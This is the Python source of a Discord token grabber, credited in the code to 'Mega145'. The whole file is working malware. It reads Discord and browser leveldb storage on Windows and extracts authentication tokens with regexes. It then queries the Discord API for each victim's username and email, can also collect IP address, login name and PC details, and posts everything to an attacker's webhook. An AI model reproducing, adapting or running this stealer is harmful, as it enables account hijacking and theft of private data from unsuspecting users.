# CONFIGURATION:
# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# determines what information you wanna send
# none of this works in RAW
SEND_IP = False
SEND_PC_INFO = False
# mentions you when you get a hit
PING_ME = False


# Style of the webhook message
# Made for Discord : TEXT , EMBED
# Custom : RAW (just sending plain text token, easier data collection)
MODE = 'EMBED'

'''
CHANGELOG:
- added RAW mode
- made code easier to read
'''


# CODE

import os
import re
import json
import random
import platform

# checking for non builtin libraries
try:
    import requests
except:
    print("some libraries could not be found")
    raise
# if system is not Windows quit 
if not platform.system() == 'Windows':
    raise OSError

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def getUserInfo(token):
    # returns the response from the discord api
    # https://discord.com/developers/docs/resources/user#get-current-user
    return json.loads(requests.get('https://discord.com/api/v9/users/@me',headers={"Authorization": token,'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}).text)

def getIP():
    url = "https://api.ipify.org/"
    response = requests.get(url)
    return response.text

def getPcInfo():
    userinfo = dict(
        user=os.getlogin(),
        pc_name=platform.uname().node,
        windows_ver='Windows ' + platform.release() + ' ' + platform.win32_edition() + ' ' + platform.version(),
    )
    return userinfo

def getPremiumType(user_data):
    # https://discord.com/developers/docs/resources/user#user-object-premium-types
    # returns the premium type in a human readable way
    try:
        if user_data['premium_type'] == 0:
            nitro = 'None'
        elif user_data['premium_type'] == 1:
            nitro = 'Nitro Classic ($5)'
        elif user_data['premium'] == 2:
            nitro = 'Nitro ($10)'
    except:
        nitro = 'None'

    return nitro


def main():
    # check if webhook url was filled in
    if WEBHOOK_URL == 'WEBHOOK HERE':
        print("Please add a webhook URL")
        raise Exception

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
    IP = None
    PC_INFO = None
    if SEND_IP:
        IP = getIP()
    if SEND_PC_INFO:
        PC_INFO = getPcInfo()

    if MODE == 'TEXT':
        message = '@everyone\n' if PING_ME else ''

        message += '**IP**\n``' + IP + '``\n' if IP else ''
        message += '**PC_INFO**\n' + f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``\nWindows Version: ``{PC_INFO['windows_ver']}``" if PC_INFO else ''


        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    try:
                        message += f'{getUserInfo(token)["username"]}#{getUserInfo(token)["discriminator"]}\n'
                        message += f'{token}\n\n'
                    except:
                        pass
            else:
                message += 'No tokens found.\n'

            message += '```'

        

        payload = json.dumps({'username':'Token Grabber by Mega145','content': message})

        try:
            requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
        except:
            pass
    elif MODE == 'EMBED':
        embeds = []
        if SEND_PC_INFO:
            PC_INFO = getPcInfo()
            color = random.randint(0, 0xFFFFFF)
            embed = {"title":'PC_INFO','description':f'``{PC_INFO["windows_ver"]}``',"color":color,"fields":[
                           {
                               "name":'**PC_IDENTITY**',
                               "value":f"Username: ``{PC_INFO['user']}``\nPC NAME: ``{PC_INFO['pc_name']}``"
                           }
                       ]}
            embeds.append(embed)
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    try:
                        raw_user = getUserInfo(token)
                        #print(raw_user)
                    except:
                        pass
                        #print('This token does not work')
                    try:
                       color = random.randint(0, 0xFFFFFF)
                       nitro = getPremiumType(raw_user)
                       user = f'{raw_user["username"]}#{raw_user["discriminator"]}'
                       embed = {"title":user,'description':f'Token:\n```{token}```',"color":color,"fields":[
                           {
                               "name":'**Discord Account Info**',
                               "value":f"NAME: ``{user}``\nEMAIL: ``{raw_user['email']}``\nNitro: ``{nitro}``\n"
                           }
                       ],'author':{
                           'name':user,'icon_url':'https://cdn.discordapp.com/avatars/' + str(raw_user['id']) + '/' + str(raw_user['avatar'])
                       }}
                       embeds.append(embed)
                    except Exception as e:
                        pass
                        #print(f'could not make an embed\n{e}')

        ping = '@everyone\n' if PING_ME else '\n'
        ip = getIP() if SEND_IP else ''
        message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping + 'IP: ``' + ip + '``',"embeds":embeds}
        payload = json.dumps(message)

        #print(message)
        response = requests.post(WEBHOOK_URL,headers=headers,data=payload.encode())
        #print(response.text)
    elif MODE == 'RAW':
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    try:
                        raw_user = getUserInfo(token)
                        response = requests.post(WEBHOOK_URL,data=token.encode())
                        print(response.text)
                    except:
                        pass
                        #print('This token does not work')
    else:
        print('MODE invalid')
if __name__ == '__main__':
    main()
